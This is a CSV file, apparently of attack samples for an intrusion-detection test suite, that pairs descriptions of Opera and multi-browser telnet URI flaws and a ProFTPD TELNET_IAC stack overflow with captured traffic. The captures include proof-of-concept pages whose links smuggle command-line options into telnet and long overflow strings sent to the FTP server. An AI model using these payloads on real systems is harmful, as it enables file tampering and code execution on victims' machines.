XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040520-01_Opera_Telnet_URI_Handler_File_Creation.xml,Opera Telnet URI Handler File Creation,Opera Software ASA&apos;s Opera Web browser is vulnerable to an attack of telnet URI handler. An attacker can invoke telnet with a trace file name as argument by requesting an URI address to opera web browser. The supplied trace file then can be created on the host of web browser&apos;s user. Therefore it is possible for the attacker to create malicious file which could be harmful to the user&apos;s system.,HTTP,TCP,"GET /poc.html HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, application/x-shockwave-flash, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)[[0D 0A ]]Host: 10.2.1.130[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20040520-01_Opera_Telnet_URI_Handler_File_Creation.xml,Opera Telnet URI Handler File Creation,Opera Software ASA&apos;s Opera Web browser is vulnerable to an attack of telnet URI handler. An attacker can invoke telnet with a trace file name as argument by requesting an URI address to opera web browser. The supplied trace file then can be created on the host of web browser&apos;s user. Therefore it is possible for the attacker to create malicious file which could be harmful to the user&apos;s system.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Fri, 21 May 2004 19:41:14 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Fri, 21 May 2004 16:59:59 GMT[[0D 0A ]]ETag: ""123c75-bd-38bd41c0""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 189[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html>[[0D 0A 0D 0A ]]<head>[[0D 0A ]]<title>Opera Telnet URI handler File Creation Vulnerability POC</title>[[0D 0A ]]</head>[[0D 0A 0D 0A ]]<body>[[0D 0A 0D 0A ]]<p><a href=""telnet://-fcrackfile"">OPERA CRACK</a></p>[[0D 0A 0D 0A ]]</body>[[0D 0A 0D 0A ]]</html>[[0D 0A]]"
﻿FSC20040520-01_Opera_Telnet_URI_Handler_File_Creation_IPv6.xml,Opera Telnet URI Handler File Creation (IPv6 Version),Opera Software ASA's Opera Web browser is vulnerable to an attack of telnet URI handler. An attacker can invoke telnet with a trace file name as argument by requesting an URI address to opera web browser. The supplied trace file then can be created on the host of web browser's user. Therefore it is possible for the attacker to create malicious file which could be harmful to the user's system. (IPv6 Version),HTTP/IPv6,TCP,"GET /poc.html HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, application/x-shockwave-flash, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)[[0D 0A ]]Host: 10.2.1.130[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20040520-01_Opera_Telnet_URI_Handler_File_Creation_IPv6.xml,Opera Telnet URI Handler File Creation (IPv6 Version),Opera Software ASA's Opera Web browser is vulnerable to an attack of telnet URI handler. An attacker can invoke telnet with a trace file name as argument by requesting an URI address to opera web browser. The supplied trace file then can be created on the host of web browser's user. Therefore it is possible for the attacker to create malicious file which could be harmful to the user's system. (IPv6 Version),HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Fri, 21 May 2004 19:41:14 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Fri, 21 May 2004 16:59:59 GMT[[0D 0A ]]ETag: ""123c75-bd-38bd41c0""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 189[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html>[[0D 0A 0D 0A ]]<head>[[0D 0A ]]<title>Opera Telnet URI handler File Creation Vulnerability POC</title>[[0D 0A ]]</head>[[0D 0A 0D 0A ]]<body>[[0D 0A 0D 0A ]]<p><a href=""telnet://-fcrackfile"">OPERA CRACK</a></p>[[0D 0A 0D 0A ]]</body>[[0D 0A 0D 0A ]]</html>[[0D 0A]]"
﻿FSC20040527-02_Multiple_Browsers_Telnet_URI_Handler_File_Manipulation_Vulnerability.xml,Multiple Browsers Telnet URI Handler File Manipulation Vulnerability,"There is a malformed URI vulnerability that affects various web-browsers. There is insufficient input validation for telnet URI (e.g., telnet://hostname). Namely, the affected products do not validate or filter &quot;-&quot; characters at the beginning of host-names. Telnet software activated by the browsers treat these as command-line options. As such, a malicious attacker may be able to compromise the target machine. Specifically, it may be possible to create or truncate a file on the target system.",HTTP,TCP,"GET /telnet_exploit.html HTTP/1.1[[0D 0A ]]Host: 10.2.1.101[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.5) Gecko/20031007[[0D 0A ]]Accept: application/x-shockwave-flash,text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
FSC20040527-02_Multiple_Browsers_Telnet_URI_Handler_File_Manipulation_Vulnerability.xml,Multiple Browsers Telnet URI Handler File Manipulation Vulnerability,"There is a malformed URI vulnerability that affects various web-browsers. There is insufficient input validation for telnet URI (e.g., telnet://hostname). Namely, the affected products do not validate or filter &quot;-&quot; characters at the beginning of host-names. Telnet software activated by the browsers treat these as command-line options. As such, a malicious attacker may be able to compromise the target machine. Specifically, it may be possible to create or truncate a file on the target system.",HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Thu, 27 May 2004 18:51:12 GMT[[0D 0A ]]Server: Apache/2.0.48 (Fedora)[[0D 0A ]]Last-Modified: Thu, 27 May 2004 18:48:56 GMT[[0D 0A ]]ETag: ""43c011-db-716c3600""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 219[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<head>[[0D 0A ]]<title>Telnet URI handler File Creation Vulnerability POC </title>[[0D 0A ]]</head>[[0D 0A ]]<body>[[0D 0A ]]<p><a href=""telnet://-fcrackfile"">Windows</a></p>[[0D 0A ]]<p><a href=""telnet://-ncrackfile"">Linux</a></p>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A]]"
﻿FSC20040527-02_Multiple_Browsers_Telnet_URI_Handler_File_Manipulation_Vulnerability_IPv6.xml,Multiple Browsers Telnet URI Handler File Manipulation Vulnerability (IPv6 Version),"There is a malformed URI vulnerability that affects various web-browsers. There is insufficient input validation for telnet URI (e.g., telnet://hostname). Namely, the affected products do not validate or filter ""-"" characters at the beginning of host-names. Telnet software activated by the browsers treat these as command-line options. As such, a malicious attacker may be able to compromise the target machine. Specifically, it may be possible to create or truncate a file on the target system. (IPv6 Version)",HTTP/IPv6,TCP,"GET /telnet_exploit.html HTTP/1.1[[0D 0A ]]Host: 10.2.1.101[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.5) Gecko/20031007[[0D 0A ]]Accept: application/x-shockwave-flash,text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
FSC20040527-02_Multiple_Browsers_Telnet_URI_Handler_File_Manipulation_Vulnerability_IPv6.xml,Multiple Browsers Telnet URI Handler File Manipulation Vulnerability (IPv6 Version),"There is a malformed URI vulnerability that affects various web-browsers. There is insufficient input validation for telnet URI (e.g., telnet://hostname). Namely, the affected products do not validate or filter ""-"" characters at the beginning of host-names. Telnet software activated by the browsers treat these as command-line options. As such, a malicious attacker may be able to compromise the target machine. Specifically, it may be possible to create or truncate a file on the target system. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Thu, 27 May 2004 18:51:12 GMT[[0D 0A ]]Server: Apache/2.0.48 (Fedora)[[0D 0A ]]Last-Modified: Thu, 27 May 2004 18:48:56 GMT[[0D 0A ]]ETag: ""43c011-db-716c3600""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 219[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<head>[[0D 0A ]]<title>Telnet URI handler File Creation Vulnerability POC </title>[[0D 0A ]]</head>[[0D 0A ]]<body>[[0D 0A ]]<p><a href=""telnet://-fcrackfile"">Windows</a></p>[[0D 0A ]]<p><a href=""telnet://-ncrackfile"">Linux</a></p>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A]]"
﻿FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[FF ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
